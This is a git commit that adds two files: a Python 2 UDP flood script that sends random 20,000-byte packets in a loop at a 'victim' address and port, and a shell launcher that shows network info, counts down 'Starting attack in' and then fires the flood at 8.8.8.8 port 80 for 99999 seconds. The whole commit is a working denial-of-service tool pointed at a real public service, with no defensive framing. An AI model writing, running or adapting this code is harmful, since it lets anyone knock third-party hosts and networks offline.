90c4d05943a2d289226c2db3672ee18afd8fe3f0
arcdeveloper7 <91615795+arcdeveloper7@users.noreply.github.com>
2022-04-02 16:00:24 +0700

    Add files via upload

---
+++ net.py
@@ -0,0 +1,35 @@
+import time
+import socket
+import random
+import sys
+def usage():
+
+    print ("Net socket4 [acro]")
+    
+def flood(victim, vport, duration):
+    # Support us yaakk... :)
+    # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # 20000 representasi satu byte ke server
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91m \033[1;32m%s \033[1;91m visnet sended to the network  "%(sent,)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
+
---
+++ viso.sh
@@ -0,0 +1,49 @@
+clear
+tput setaf 2
+echo "===========+[IP ROUTE INFO]+============"
+ip route list
+echo "========================================"
+read -t 2
+clear
+echo "=============+[Interface]+=============="
+iwconfig
+read -t 2 
+clear
+echo "==============+[IP addr]+==============="
+ifconfig
+read -t 3
+clear
+
+tput setaf 33
+echo Starting attack in [5]
+read -t 1
+clear
+
+tput setaf 33
+echo Starting attack in [4]
+read -t 1
+clear
+
+tput setaf 33
+echo Starting attack in [3]
+read -t 1
+clear
+
+tput setaf 33
+echo Starting attack in [2]
+read -t 1
+clear
+
+tput setaf 33
+echo Starting attack in [1]
+read -t 1
+clear
+
+
+
+
+tput setaf 2
+echo "Attacking..."
+
+
+python2 net.py 8.8.8.8 80 99999
